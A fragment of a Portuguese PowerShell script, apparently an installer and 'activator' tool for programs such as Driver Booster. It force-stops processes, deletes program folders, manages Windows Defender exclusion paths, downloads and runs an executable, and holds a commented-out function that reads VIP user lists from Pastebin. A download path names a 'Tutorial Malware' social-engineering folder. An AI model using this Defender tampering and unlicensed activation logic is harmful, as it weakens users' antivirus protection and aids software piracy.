                                    Set-MpPreference -ExclusionPath $currentExclusions
                                    Set-MpPreference -SubmitSamplesConsent 1

                                }

                            }
                        
                            Start-Sleep -Seconds 3

                            Write-Host -NoNewline "      Confirme se o" -ForegroundColor Yellow
                            Write-Host -NoNewline  " '$nome_programa' " -ForegroundColor Cyan
                            Write-Host -NoNewline  "foi desinstalado, para verificar se tudo ocorreu bem." -ForegroundColor Yellow
                            Write-Host ""
                            Write-Host ""

                            $remocao_completa = Read-Host "      Verificar desinstalação do $nome_programa ? (S/N)"

                            if($remocao_completa -eq 's' -or $remocao_completa -eq 'n'){

                                # Verifica se a pasta ainda existe
                                if (Test-Path $folderFound) {

                                    Write-Host ""
                                    Write-Host "      A desinstalação falhou, não foi concluída corretamente." -ForegroundColor Yellow
                                    write-Host "      Algum processo não permitido está em execução, ou o programa não está instalado no seu computador." -ForegroundColor Red
                                    Write-Host ""

                                    if ( $EtapaInstAtv ) { Start-Sleep -Seconds 5 }

                                } elseif(Test-Path $folderFoundAtual) {
                                    Write-Host ""
                                    Write-Host "      A desinstalação falhou, não foi concluída corretamente ou foi." -ForegroundColor Yellow
                                    write-Host "      Algum processo não permitido está em execução, ou o programa não está instalado no seu computador." -ForegroundColor Red
                                    Write-Host ""
                                
                                   if ( $EtapaInstAtv ) { Start-Sleep -Seconds 5 }

                                } else {

                                    Write-Host ""
                                    Write-Host "      Desinstalação de $nome_programa foi concluída com sucesso." -ForegroundColor Green
                                    Write-Host ""

                                    if ( $EtapaInstAtv ) { Start-Sleep -Seconds 5 }
                                }

                            } 
                        }

                    } elseif ($metodo_remover -eq 'c') {

                        $processesRunning = CheckProcessesRunning

                        if ($processesRunning) {
                        
                            $processNames = $processesRunning | ForEach-Object { $_.Name } 
                         
                            Write-Host ""          
                            Write-Host "Os processos $($processNames -join ', ') estão em execução." -ForegroundColor Yellow
                            Write-Host "Fechando os processos para iniciar a desinstalação..." -ForegroundColor Red
                            Write-Host ""
                        
                            foreach ($processName in $processNames) {
                                $process = Get-Process -Name $processName
                                Stop-Process -Id $process.Id -Force
                            }

                            # Inicia o processo de desinstalação

                            if ($folderFoundAtual) {

                                Write-Host ""
                                Write-Host "     ===============================================================================================================" -ForegroundColor Green
                                Write-Host ""
                                Write-Host -NoNewline "      Desinstalação completa de" -ForegroundColor Yellow
                                Write-Host -NoNewline " '$nome_programa $versao_disponivel' " -ForegroundColor Cyan
                                Write-Host -NoNewline "iniciada..." -ForegroundColor Yellow
                                Write-Host ""
                                Write-Host ""
                                Write-Host "      Abrindo desinstalador de $nome_programa..." -ForegroundColor Green  
                                Write-Host ""

                                if ($destino_atv_key -ne $destino_atv) {
                        
                                    # Extrai o diretório do arquivo
                                    $targetDir = Split-Path $exePath_unis_atual
                        
                                    # Extrai o nome do arquivo (DFStd.exe)
                                    $excludedFile = Split-Path $exePath_unis_atual -Leaf

                                    # Obtém todos os arquivos no diretório, exceto o arquivo DFStd.exe
                                    $filesToDelete = Get-ChildItem -Path $targetDir -File | Where-Object { $_.Name -ne $excludedFile }

                                    if ($MetodoSelecionado -eq "Chave/Serial" -and $stepsAtvToCheck["processo_ativacao"].Contains('Pré-instalação')) {
                        
                                        if ($filesToDelete.Count -gt 0) { foreach ($file in $filesToDelete) { Remove-Item -Path $file.FullName -Force } }

                                        Write-Host ""
                                        Write-Host -NoNewline "      Aguardando o processo de desinstalação do" -ForegroundColor Yellow
                                        Write-Host -NoNewline " '$nome_programa' " -ForegroundColor Cyan
                                        Write-Host -NoNewline "terminar..." -ForegroundColor Yellow
                                        Write-Host ""

                                    } else {

                                        Remove-Item -Recurse -Force $destino_atv_key

                                        Write-Host ""
                                        Write-Host -NoNewline "      Aguardando o processo de desinstalação do" -ForegroundColor Yellow
                                        Write-Host -NoNewline " '$nome_programa' " -ForegroundColor Cyan
                                        Write-Host -NoNewline "terminar..." -ForegroundColor Yellow
                                        Write-Host ""
                                    }

                                } else {

                                    Write-Host ""
                                    Write-Host -NoNewline "      Aguardando o processo de desinstalação do" -ForegroundColor Yellow
                                    Write-Host -NoNewline " '$nome_programa' " -ForegroundColor Cyan
                                    Write-Host -NoNewline "terminar..." -ForegroundColor Yellow
                                    Write-Host ""
                    
                                }

                                # Inciando o processo de desinstalação e aguardando sua conclusão
                                Start-Process -FilePath $exePath_unis_atual -PassThru -Wait

                            } else {

                                Write-Host ""
                                Write-Host "     ===============================================================================================================" -ForegroundColor Green
                                Write-Host ""
                                Write-Host -NoNewline "      Desinstalação completa de" -ForegroundColor Yellow
                                Write-Host -NoNewline " '$nome_programa $programVersionAnterior' " -ForegroundColor Cyan
                                Write-Host -NoNewline "iniciada..." -ForegroundColor Yellow
                                Write-Host ""
                                Write-Host ""
                                Write-Host "      Abrindo desinstalador de $nome_programa..." -ForegroundColor Green  
                                Write-Host ""

                                if ($destino_atv_key -ne $destino_atv) {
                        
                                    # Extrai o diretório do arquivo
                                    $targetDir = Split-Path $exePath_unis_atual
                        
                                    # Extrai o nome do arquivo (DFStd.exe)
                                    $excludedFile = Split-Path $exePath_unis_atual -Leaf

                                    # Obtém todos os arquivos no diretório, exceto o arquivo DFStd.exe
                                    $filesToDelete = Get-ChildItem -Path $targetDir -File | Where-Object { $_.Name -ne $excludedFile }

                                    if ($MetodoSelecionado -eq "Chave/Serial" -and $stepsAtvToCheck["processo_ativacao"].Contains('Pré-instalação')) {
                        
                                        if ($filesToDelete.Count -gt 0) { foreach ($file in $filesToDelete) { Remove-Item -Path $file.FullName -Force } }

                                        Write-Host ""
                                        Write-Host -NoNewline "      Aguardando o processo de desinstalação do" -ForegroundColor Yellow
                                        Write-Host -NoNewline " '$nome_programa' " -ForegroundColor Cyan
                                        Write-Host -NoNewline "terminar..." -ForegroundColor Yellow
                                        Write-Host ""

                                    } else {

                                        Remove-Item -Recurse -Force $destino_atv_key

                                        Write-Host ""
                                        Write-Host -NoNewline "      Aguardando o processo de desinstalação do" -ForegroundColor Yellow
                                        Write-Host -NoNewline " '$nome_programa' " -ForegroundColor Cyan
                                        Write-Host -NoNewline "terminar..." -ForegroundColor Yellow
                                        Write-Host ""
                                    }

                                } else {

                                    Write-Host ""
                                    Write-Host -NoNewline "      Aguardando o processo de desinstalação do" -ForegroundColor Yellow
                                    Write-Host -NoNewline " '$nome_programa' " -ForegroundColor Cyan
                                    Write-Host -NoNewline "terminar..." -ForegroundColor Yellow
                                    Write-Host ""
                    
                                }

                                # fazer a verificaão se a versão atual e igual a disponivel 
                                Start-Process -FilePath $exePath_unis_found.FullName -PassThru -Wait
                            }

                        } else {
           
                            # Inicia o processo de desinstalação

                            if ($folderFoundAtual) {

                                Write-Host ""
                                Write-Host "     ===============================================================================================================" -ForegroundColor Green
                                Write-Host ""
                                Write-Host -NoNewline "      Desinstalação completa de" -ForegroundColor Yellow
                                Write-Host -NoNewline " '$nome_programa $versao_disponivel' " -ForegroundColor Cyan
                                Write-Host -NoNewline "iniciada..." -ForegroundColor Yellow
                                Write-Host ""
                                Write-Host ""
                                Write-Host "      Abrindo desinstalador de $nome_programa..." -ForegroundColor Green  
                                Write-Host ""

                                if ($destino_atv_key -ne $destino_atv) {
                        
                                    # Extrai o diretório do arquivo
                                    $targetDir = Split-Path $exePath_unis_atual
                        
                                    # Extrai o nome do arquivo (DFStd.exe)
                                    $excludedFile = Split-Path $exePath_unis_atual -Leaf

                                    # Obtém todos os arquivos no diretório, exceto o arquivo DFStd.exe
                                    $filesToDelete = Get-ChildItem -Path $targetDir -File | Where-Object { $_.Name -ne $excludedFile }

                                    if ($MetodoSelecionado -eq "Chave/Serial" -and $stepsAtvToCheck["processo_ativacao"].Contains('Pré-instalação')) {
                        
                                        if ($filesToDelete.Count -gt 0) { foreach ($file in $filesToDelete) { Remove-Item -Path $file.FullName -Force } }

                                        Write-Host ""
                                        Write-Host -NoNewline "      Aguardando o processo de desinstalação do" -ForegroundColor Yellow
                                        Write-Host -NoNewline " '$nome_programa' " -ForegroundColor Cyan
                                        Write-Host -NoNewline "terminar..." -ForegroundColor Yellow
                                        Write-Host ""

                                    } else {

                                        Remove-Item -Recurse -Force $destino_atv_key

                                        Write-Host ""
                                        Write-Host -NoNewline "      Aguardando o processo de desinstalação do" -ForegroundColor Yellow
                                        Write-Host -NoNewline " '$nome_programa' " -ForegroundColor Cyan
                                        Write-Host -NoNewline "terminar..." -ForegroundColor Yellow
                                        Write-Host ""
                                    }

                                } else {

                                    Write-Host ""
                                    Write-Host -NoNewline "      Aguardando o processo de desinstalação do" -ForegroundColor Yellow
                                    Write-Host -NoNewline " '$nome_programa' " -ForegroundColor Cyan
                                    Write-Host -NoNewline "terminar..." -ForegroundColor Yellow
                                    Write-Host ""
                    
                                }

                                # Inciando o processo de desinstalação e aguardando sua conclusão
                                Start-Process -FilePath $exePath_unis_atual -PassThru -Wait

                            } else {

                                Write-Host ""
                                Write-Host "     ===============================================================================================================" -ForegroundColor Green
                                Write-Host ""
                                Write-Host -NoNewline "      Desinstalação completa de" -ForegroundColor Yellow
                                Write-Host -NoNewline " '$nome_programa $programVersionAnterior' " -ForegroundColor Cyan
                                Write-Host -NoNewline "iniciada..." -ForegroundColor Yellow
                                Write-Host ""
                                Write-Host ""
                                Write-Host "      Abrindo desinstalador de $nome_programa..." -ForegroundColor Green  
                                Write-Host ""

                                if ($destino_atv_key -ne $destino_atv) {
                        
                                    # Extrai o diretório do arquivo
                                    $targetDir = Split-Path $exePath_unis_atual
                        
                                    # Extrai o nome do arquivo (DFStd.exe)
                                    $excludedFile = Split-Path $exePath_unis_atual -Leaf

                                    # Obtém todos os arquivos no diretório, exceto o arquivo DFStd.exe
                                    $filesToDelete = Get-ChildItem -Path $targetDir -File | Where-Object { $_.Name -ne $excludedFile }

                                    if ($MetodoSelecionado -eq "Chave/Serial" -and $stepsAtvToCheck["processo_ativacao"].Contains('Pré-instalação')) {
                        
                                        if ($filesToDelete.Count -gt 0) { foreach ($file in $filesToDelete) { Remove-Item -Path $file.FullName -Force } }

                                        Write-Host ""
                                        Write-Host -NoNewline "      Aguardando o processo de desinstalação do" -ForegroundColor Yellow
                                        Write-Host -NoNewline " '$nome_programa' " -ForegroundColor Cyan
                                        Write-Host -NoNewline "terminar..." -ForegroundColor Yellow
                                        Write-Host ""

                                    } else {

                                        Remove-Item -Recurse -Force $destino_atv_key

                                        Write-Host ""
                                        Write-Host -NoNewline "      Aguardando o processo de desinstalação do" -ForegroundColor Yellow
                                        Write-Host -NoNewline " '$nome_programa' " -ForegroundColor Cyan
                                        Write-Host -NoNewline "terminar..." -ForegroundColor Yellow
                                        Write-Host ""
                                    }

                                } else {

                                    Write-Host ""
                                    Write-Host -NoNewline "      Aguardando o processo de desinstalação do" -ForegroundColor Yellow
                                    Write-Host -NoNewline " '$nome_programa' " -ForegroundColor Cyan
                                    Write-Host -NoNewline "terminar..." -ForegroundColor Yellow
                                    Write-Host ""
                    
                                }

                                # fazer a verificaão se a versão atual e igual a disponivel 
                                Start-Process -FilePath $exePath_unis_found.FullName -PassThru -Wait
                            }
                        } 

                        # fazer verificação

                        # Verifica que a pasta default, anterior a principal aonde se encontra o programa, tem uma subpasta e se dentro dela contém arquivos,
                        # ou se fora dessa minha subpasta dentro da pasta default anterior a principal, tem arquivos sobrando também.
                        

                        if ((Test-Path $folderFound)) {

                            $subfoldersProgramFound = Get-ChildItem -Path $folderFound -Directory
                        
                            if ($subfoldersProgramFound.Count -gt 0) {
                                $subfolderPathProgramFound = $subfoldersProgramFound[0].FullName
                                $filesInProgramFound = Get-ChildItem -Path $subfolderPathProgramFound -File 
                                $filesInfolderFound = Get-ChildItem -Path $folderFound -File
                            } else {
                                $filesInfolderFound = Get-ChildItem -Path $folderFound -File
                            }

                            if ((Test-Path $folderFound) -or ((Test-Path $folderFound) -and $subfolderProgramFound.Count -ge 0 -and $filesInProgramFound.Count -ge 0) -or ((Test-Path $folderFound) -and $filesInfolderFound.Count -gt 0)) {
                           

                                ## AJUSTES WINDOWS DEFENDER

                                if ($destino_atv_key -ne $destino_atv) {
                                    # Lista de caminhos de exclusão a serem removidos
                                    $exclusionsToRemove = @($extracao, $extracao_atv, $destino_atv, $destino_atv_key) # Adicione mais caminhos aqui, se necessário
                                } else {
                                    # Lista de caminhos de exclusão a serem removidos
                                    $exclusionsToRemove = @($extracao, $extracao_atv, $destino_atv) # Adicione mais caminhos aqui, se necessário
                                }

                                # Obtém a lista atual de exclusões
                                $currentExclusions = Get-MpPreference | Select-Object -ExpandProperty ExclusionPath

                                # Remove exclusões que estão presentes na lista de exclusões
                                foreach ($exclusion in $exclusionsToRemove) {
                                    if ($currentExclusions -contains $exclusion) {
                                        # Remove o caminho da exclusão
                                        $currentExclusions = $currentExclusions | Where-Object { $_ -ne $exclusion }
                                    }
                                }

                                # Atualiza a lista de exclusões

                                Set-MpPreference -ExclusionPath $currentExclusions
                                Set-MpPreference -SubmitSamplesConsent 1
                                
                                if ( $EtapaInstAtv ) { Start-Sleep -Seconds 5 }

                            } else {
                            
                                Write-Host ""
                                Write-Host -NoNewline  "      Houve alguma falha no processo de desinstalação do" -ForegroundColor Red
                                Write-Host -NoNewline  " '$nome_programa $versao_disponivel'." -ForegroundColor Cyan
                                Write-Host ""
                                Write-Host "" 
                        
                                if ( $EtapaInstAtv ) { Start-Sleep -Seconds 5 }
                            }

                        } else {
                        
                            ## AJUSTES WINDOWS DEFENDER

                            if ($destino_atv_key -ne $destino_atv) {
                                # Lista de caminhos de exclusão a serem removidos
                                $exclusionsToRemove = @($extracao, $extracao_atv, $destino_atv, $destino_atv_key) # Adicione mais caminhos aqui, se necessário
                            } else {
                                # Lista de caminhos de exclusão a serem removidos
                                $exclusionsToRemove = @($extracao, $extracao_atv, $destino_atv) # Adicione mais caminhos aqui, se necessário
                            }

                            # Obtém a lista atual de exclusões
                            $currentExclusions = Get-MpPreference | Select-Object -ExpandProperty ExclusionPath

                            # Remove exclusões que estão presentes na lista de exclusões
                            foreach ($exclusion in $exclusionsToRemove) {
                                if ($currentExclusions -contains $exclusion) {
                                    # Remove o caminho da exclusão
                                    $currentExclusions = $currentExclusions | Where-Object { $_ -ne $exclusion }
                                }
                            }

                            # Atualiza a lista de exclusões

                            Set-MpPreference -ExclusionPath $currentExclusions
                            Set-MpPreference -SubmitSamplesConsent 1
                        }

                        Write-Host ""
                        Write-Host -NoNewline "      Confirme se o" -ForegroundColor Yellow
                        Write-Host -NoNewline " '$nome_programa' " -ForegroundColor Cyan
                        Write-Host -NoNewline "foi desinstalado, para verificar se tudo ocorreu bem." -ForegroundColor Yellow
                        Write-Host ""
                        Write-Host ""

                        $remocao_completa = Read-Host "      Verificar desinstalação do $nome_programa ? (S/N)"
                   
                        $folderFoundProgramAtual = $($pathsToCheck['pasta_instalacao']) 

                        if (Test-Path $folderFoundProgramAtual) {
                        
                            # Verifica que a pasta principal aonde se encontra o programa, tem uma subpasta e se dentro dela contém arquivos,
                            # ou se fora dessa minha subpasta dentro da pasta principal do programa, tem arquivos sobrando também.

                            $subfoldersProgramAtual = Get-ChildItem -Path $folderFoundProgramAtual -Directory

                            if ($subfoldersProgramAtual.Count -gt 0) {
                                $subfolderProgramAtualPath = $subfoldersProgramAtual[0].FullName
                                $filesInProgramAtual =  Get-ChildItem -Path $subfolderProgramAtualPath -File 
                                $filesInfolderFoundAtual = Get-ChildItem -Path $folderFoundProgramAtual -File
                            } else {
                                $filesInfolderFoundAtual = Get-ChildItem -Path $folderFoundProgramAtual -File
                            } 

                        } elseif (Test-Path $folderFound) {

                            # Verifica que a pasta default, anterior a principal aonde se encontra o programa, tem uma subpasta e se dentro dela contém arquivos,
                            # ou se fora dessa minha subpasta dentro da pasta default anterior a principal, tem arquivos sobrando também.
                        
                            $subfoldersProgramFound = Get-ChildItem -Path $folderFound -Directory
                        
                            if ($subfoldersProgramFound.Count -gt 0) {
                            
                                foreach ($subfolderProgramFound in $subfoldersProgramFound) {

                                    $subfolderProgramFoundPath = $subfolderProgramFound.FullName

                                    if ($subfolderProgramFoundPath -like $($pathsToCheck['pasta_instalacao'])) {
                                        $filesInProgramFound = Get-ChildItem -Path $subfolderProgramFoundPath -File
                                        $subFoundInProgramFound = Get-ChildItem -Path $subfolderProgramFoundPath -Directory
                                        $filesInfolderFound = Get-ChildItem -Path $folderFound -File
                                    } else {
                                        $filesInfolderFound = Get-ChildItem -Path $folderFound -File
                                    }

                                }
                            } else {
                                $filesInfolderFound = Get-ChildItem -Path $folderFound -File
                            }
                       

                        } else {

                            $filesInProgramAtual = @() # Define uma lista vazia se o caminho não existir
                            $subfoldersProgramAtual = @() # Define uma lista vazia se o caminho não existir
                            $filesInfolderFoundAtual = @() # Define uma lista vazia se o caminho não existir

                            $filesInProgramFound = @() # Define uma lista vazia se o caminho não existir
                            $subFoundInProgramFound = @() # Define uma lista vazia se o caminho não existir
                            $filesInfolderFound = @() # Define uma lista vazia se o caminho não existir
                        }
                                
                        Write-Host ""

                        if($remocao_completa -eq 's' -or $remocao_completa -eq 'n'){

                            # Verifica se a pasta ainda existe
                            if (((Test-Path $folderFound) -and $subFoundInProgramFound.Count -ge 1 -and $filesInProgramFound.Count -ge 1 -or $filesInfolderFound.Count -ge 1) -or ((Test-Path $folderFound) -and $filesInfolderFound.Count -ge 1)) {
                            
                                Write-Host -NoNewline "      Seu" -ForegroundColor Green
                                Write-Host -NoNewline " '$nome_programa' " -ForegroundColor Cyan
                                Write-Host -NoNewline "foi desinstalado parcialmente." -ForegroundColor Green
                                Write-Host ""
                                Write-Host ""
                                write-Host -NoNewline "      Talvez seja necessário reniciar o computador para ser desinstalado completamente." -ForegroundColor Yellow
                                Write-Host ""
                                write-Host -NoNewline "      Devido á sobras de backup ou configuração/personalização." -ForegroundColor Yellow
                                Write-Host ""
                                write-Host -NoNewline "      Ou tenha outros produtos instalado que seja do mesmo desenvolvedor." -ForegroundColor Yellow
                                Write-Host ""
                                Write-Host ""
                                
                                if ( $EtapaInstAtv ) { Start-Sleep -Seconds 5 }

                            } elseif (((Test-Path $folderFoundProgramAtual) -and $subfoldersProgramAtual.Count -ge 1 -and $filesInProgramAtual.Count -ge 1 -or $filesInfolderFoundAtual.Count -ge 1) -or ((Test-Path $folderFoundProgramAtual) -and $filesInfolderFoundAtual.Count -ge 1) -or ((Test-Path $folderFoundProgramAtual))) {
                            
                                Write-Host -NoNewline "      Seu" -ForegroundColor Green
                                Write-Host -NoNewline " '$nome_programa' " -ForegroundColor Cyan
                                Write-Host -NoNewline "foi desinstalado parcialmente." -ForegroundColor Green
                                Write-Host ""
                                Write-Host ""
                                write-Host -NoNewline "      Talvez seja necessário reniciar o computador para ser desinstalado completamente." -ForegroundColor Yellow
                                Write-Host ""
                                write-Host -NoNewline "      Devido á sobras de backup ou configuração/personalização." -ForegroundColor Yellow
                                Write-Host ""
                                write-Host -NoNewline "      Ou tenha outros produtos instalado que seja do mesmo desenvolvedor." -ForegroundColor Yellow
                                Write-Host ""
                                Write-Host ""
                                
                                if ( $EtapaInstAtv ) { Start-Sleep -Seconds 5 }

                            } else {
                                Write-Host "      Desinstalação de '$nome_programa' foi concluída com sucesso." -ForegroundColor Green
                                Write-Host ""

                                if ( $EtapaInstAtv ) { Start-Sleep -Seconds 5 }
                            }
                        }
                    } else {
                        
                        Write-Host ""
                        Write-Host "      Desinstalação cancelada." -ForegroundColor Red
                        Write-Host ""

                        if ( $EtapaInstAtv ) { Start-Sleep -Seconds 5 }
                    }


                }
                
            } 
                
        } else {

            Write-Host ""
            Write-Host "      O programa $nome_programa $versao_disponivel não está instalado." -ForegroundColor Red
            Write-Host ""

            if ( $EtapaInstAtv ) { Start-Sleep -Seconds 5 }
        }

    }

    if ($etapa_processo -eq "Instalacao") {

        InstalarPrograma

    } elseif($etapa_processo -eq "Ativacao") {
        
        AtivarPrograma

    } elseif($etapa_processo -eq "Desinstalacao") {
        
        DesinstalarPrograma

    } elseif($etapa_processo -eq "Visualizacao") {

        if ($stepsAtvToCheck["processo_ativacao"].Contains('Pré-instalação')){
            
            DesinstalarPrograma -EtapaInstAtv $true
            AtivarPrograma -EtapaInstAtv $true
            InstalarPrograma -EtapaInstAtv $true

        } else {
            
            InstalarPrograma -EtapaInstAtv $true
            AtivarPrograma -EtapaInstAtv $true
        } 

    } else {
        
        DesinstalarPrograma -EtapaInstAtv $true
        InstalarPrograma -EtapaInstAtv $true
        AtivarPrograma -EtapaInstAtv $true
    }


}

<#
function Show-Detail-Produto {
    param(
        [string]$ProgramaEscolhido,
        [string]$UsuarioAtual
    )

    $loop = $true
    
    # Obter o conteúdo do Pastebin
    $url = "https://pastebin.com/raw/2GXCsBJ7"

    try {
        $conteudo_pastebin = Invoke-RestMethod -Uri $url -ErrorAction Stop
    } catch {
        Write-Host "Erro ao obter dados do Pastebin: $_" -ForegroundColor Red
        return
    }

    # Encontrar a linha correspondente ao usuário atual
    $linha_usuario = $conteudo_pastebin -split "`n" | Where-Object {$_ -match "^$UsuarioAtual\|"}
    if (-not $linha_usuario) {
        Write-Host "Usuário não encontrado." -ForegroundColor Red
        return
    }

    $tipoConta = $linha_usuario.Split("|")[6].Trim()
    $urlDetalhes = if ($tipoConta -eq "VIP") {
        "https://pastebin.com/raw/jBAm4qvE"
    } else {
        "https://pastebin.com/raw/0mENP01B"
    }

    # Obter os detalhes do programa
    try {
        $conteudo_detalhes = Invoke-RestMethod -Uri $urlDetalhes -ErrorAction Stop
    } catch {
        Write-Host "Erro ao obter detalhes do programa: $_" -ForegroundColor Red
        return
    }

    $linha_programa = $conteudo_detalhes -split "`n" | Where-Object {$_ -like "$ProgramaEscolhido*"}
    if (-not $linha_programa) {
        Write-Host "Programa não encontrado." -ForegroundColor Red
        return
    }

    $dados_programa = $linha_programa.Split("|")
    $nome_programa = $dados_programa[0].Trim()
    $ano_programa = $dados_programa[1].Trim()
    $versao_atual = $dados_programa[2].Trim()
    $versao_disponivel = $dados_programa[3].Trim()
    $disponibilidade_download = $dados_programa[7].Trim()

    do {
            cls
            Write-Host ""
            Write-Host "     =========================================" -ForegroundColor Green
            Write-Host "          DETALHES DO PRODUTO SELECIONADO     " -ForegroundColor Cyan
            Write-Host "     =========================================" -ForegroundColor Green
            Write-Host ""
            Write-Host "     ===============================================================================================================" -ForegroundColor Green 
            Write-Host -NoNewline "      DETALHES DO PROGRAMA: "  -ForegroundColor Cyan
            Write-Host "[$ProgramaEscolhido]" -ForegroundColor Magenta
            Write-Host " "
            Write-Host -NoNewline "      PROGRAMA: "
            Write-Host "$nome_programa" -ForegroundColor Yellow
            Write-Host -NoNewline "      ANO: "
            Write-Host "$ano_programa" -ForegroundColor Yellow
            Write-Host -NoNewline "      VERSÃO ATUAL: "
            Write-Host "$versao_atual" -ForegroundColor Yellow
            Write-Host -NoNewline "      VERSÃO DISPONÍVEL: "
            Write-Host "$versao_disponivel" -ForegroundColor Yellow
            Write-Host -NoNewline "      DISPONIBILIDADE DOWNLOAD: "
            Write-Host "$disponibilidade_download" -ForegroundColor Green
            Write-Host "     ===============================================================================================================" -ForegroundColor Green
            Write-Host ""
            Write-Host -NoNewline "     [1] - " -ForegroundColor Yellow
            Write-Host "Instalar e Ativar $nome_programa" -NoNewline -ForegroundColor Yellow
            Write-Host " ($ano_programa/$versao_disponivel)" -ForegroundColor Gray
            Write-Host -NoNewline "     [2] - " -ForegroundColor Yellow
            Write-Host "Instalar $nome_programa" -NoNewline -ForegroundColor Yellow
            Write-Host " ($ano_programa/$versao_disponivel)" -ForegroundColor Gray
            Write-Host -NoNewline "     [3] - " -ForegroundColor Yellow
            Write-Host "Ativar $nome_programa" -NoNewline -ForegroundColor Green
            Write-Host " ($ano_programa/$versao_disponivel)" -ForegroundColor Gray
            Write-Host -NoNewline "     [4] - " -ForegroundColor Yellow
            Write-Host "Desinstalar $nome_programa" -NoNewline -ForegroundColor Red
            Write-Host " (DESINSTALAÇÃO SIMPLES/COMPLETA)" -ForegroundColor Gray
            Write-Host ""
            Write-Host -NoNewline "     [V] - "  -ForegroundColor Cyan
            Write-Host "Voltar"
            Write-Host ""
            Write-Host "     ===============================================================================================================" -ForegroundColor Green
            Write-Host ""


        function InstalarPrograma {
            # Lógica para instalação do programa
            if ($nome_programa -eq "Driver Booster") {

                # Função para verificar se os processos estão em execução
                function CheckProcessesRunning {
                    $processesToCheck = @("DriverBooster", "setup")
                    return Get-Process | Where-Object { $processesToCheck -contains $_.Name }
                }

                # Pasta de instalação do Programa
                $pathsToCheck = @(
                    "C:\Program Files (x86)\Driver Booster",
                    "C:\Program Files\Driver Booster",
                    "C:\Driver Booster",
                    "C:\Program Files (x86)\IObit\Driver Booster\11.5.0",
                    "C:\Program Files (x86)\IObit\Driver Booster\11.4.0",
                    "C:\Program Files (x86)\IObit\Driver Booster\11.3.0",
                    "C:\Program Files (x86)\IObit\Driver Booster\11.2.0",
                    "C:\Program Files (x86)\IObit\Driver Booster\11.1.0",
                    "C:\Program Files (x86)\IObit\Driver Booster\11.0.0"
                )

                $folderFound = $null

                foreach ($path in $pathsToCheck) {
                    if (Test-Path $path -PathType Container) {
                        $folderFound = $path
                        break
                    }
                }

                if ($folderFound) {

                    Write-Host ""
                    Write-Host "     ===============================================================================================================" -ForegroundColor Cyan
                    Write-Host ""
                    Write-Host "      O programa $nome_programa já está instalado em seu computador."
                    Write-Host "      Processo de instalação do $nome_programa cancelado."
                    Write-Host ""

                } else {

                    $processesRunning = CheckProcessesRunning

                    if ($processesRunning){

                        Write-Host ""
                        Write-Host "     ===============================================================================================================" -ForegroundColor Red
                        Write-Host ""
                        Write-Host "      Os processos $($processNames -join ', ') estão em execução."
                        Write-Host "      Fechando os processos para iniciar a instalação..."
                        Write-Host ""
                            
                        $processNames = $processesRunning | ForEach-Object { $_.Name }

                        foreach ($processName in $processNames) {
                            $process = Get-Process -Name $processName
                            Stop-Process -Id $process.Id
                        }

                    } else {

                        Write-Host ""
                        Write-Host "     ===============================================================================================================" -ForegroundColor Green
                        Write-Host ""
                        Write-Host "      Preparando seu dispositvo para dar início á etapa de instalação do '$nome_programa' em seu computador."
                        Write-Host ""
                    }

                    $opcao_instalacao = Read-Host "      Deseja instalar o $nome_programa no seu computador? (S/N)"

                    if ($opcao_instalacao -eq 's') {                              

                        # Definir a URL do arquivo e o destino
                        $url = "https://www.iobit.com/downloadcenter.php?product=pt-driver-booster-free"
                        $destino = "C:\Users\$env:USERNAME\Desktop\Games\Tutorial Malware\#1 - Engeharia Social - Batch File\driver-booster-free.exe"
                        $progam_folder = "C:\Program Files (x86)\IObit\Driver Booster\11.5.0"
                        $program_exe = "C:\Program Files (x86)\IObit\Driver Booster\11.5.0\DriverBooster.exe"                                    

                        try {

                            $processesRunning = CheckProcessesRunning

                            if ($processesRunning) {

                                Write-Host ""
                                Write-Host "     ===============================================================================================================" -ForegroundColor Red       
                                Write-Host ""
                                Write-Host "      Os processos $($processNames -join ', ') estão em execução."
                                Write-Host "      Fechando os processos para iniciar a instalação..."
                            
                                $processNames = $processesRunning | ForEach-Object { $_.Name }

                                foreach ($processName in $processNames) {
                                    $process = Get-Process -Name $processName
                                    Stop-Process -Id $process.Id
                                }


                            } else {
                                Write-Host ""
                                Write-Host "      Baixando o setup oficial de instalação do $nome_programa."
                                Write-Host ""

                                # Baixar o arquivo
                                $client = New-Object System.Net.WebClient
                                $client.DownloadFile($url, $destino)
                            }
                                    
                            if (Test-Path $destino) {

                                # Inicia o processo de instação

                                Write-Host "      Instalação oficial de $nome_programa iniciada..."
                                Write-Host "      Abrindo o instalador de $nome_programa..."  

                                # Incia e depois Remove o setup do instalador do programa.

                                Start-Process -FilePath $destino -PassThru
                                    
                                Start-Sleep -Seconds 20

                                $processesRunning = CheckProcessesRunning

                                if ($processesRunning) {

                                    Write-Host ""
                                    Write-Host "      Aguardando o processo de instalação do $nome_programa terminar..."
                                    Write-Host ""
                                    Write-Host "      Confirme se o $nome_programa foi instalado, e verifique se tudo ocorreu bem."
                                    $instalacao_completa = Read-Host "      Verificar instalação do $nome_programa ? (S/N)"
                                    Write-Host ""


                                    if($instalacao_completa -eq 's' -or $instalacao_completa -eq 'n' -and $processesRunning.HasExited){
                                        # Verifica se a pasta ainda existe
                                        if (Test-Path $progam_folder) {
                                                
                                            Write-Host "      Instalação de $nome_programa foi concluída com sucesso."
                                            Write-Host ""
                                                
                                            # Remove o setup de instalação
                                            Remove-Item $destino -Force

                                            $opcao_verficar_instalacao = Read-Host "      Deseja iniciar o $nome_programa para confirmar sua instalação? (S/N)"
                                                    
                                            $processesRunning = CheckProcessesRunning
                                                    
                                            $processNames = $processesRunning | ForEach-Object { $_.Name }

                                            foreach ($processName in $processNames) {
                                                $process = Get-Process -Name $processName
                                                Stop-Process -Id $process.Id
                                            }

                                            if ($opcao_verficar_instalacao -eq 's') {
                                                Start-Process $program_exe
                                            } else {
                                                Write-Host ""
                                                Write-Host "      Inicie a etapa '3' de ativação para ativar seu $nome_produto"
                                            }

                                        } else {
                                            Write-Host "      A instalação falhou ou não foi concluída corretamente."
                                            write-Host "      Algum processo não permitido está em execução, ou o $nome_programa já estava instalado no seu computador."
                                            Write-Host ""
                                        }
                                    } else{
                                        Write-Host ""
                                        Write-Host "      O processo de instalação do $nome_programa está em execução ou ainda não terminou..."
                                        Write-Host ""
                                    }

                                } else {
                                    Write-Host ""
                                    Write-Host "      O processo de instalação do $nome_programa não está em execução."
                                    Write-Host ""
                                }

                            } else {
                                Write-Host ""
                                Write-Host "      O arquivo $exePath não foi encontrado."
                                Write-Host ""
                            }
                                
                        } catch {
                            Write-Host ""
                            Write-Host "      Erro ao baixar o arquivo: $_" -ForegroundColor Red
                            Write-Host ""
                        }
                    } else {
                        Write-Host ""
                        Write-Host "      Instalação cancelada."
                        Write-Host ""
                    }
                }

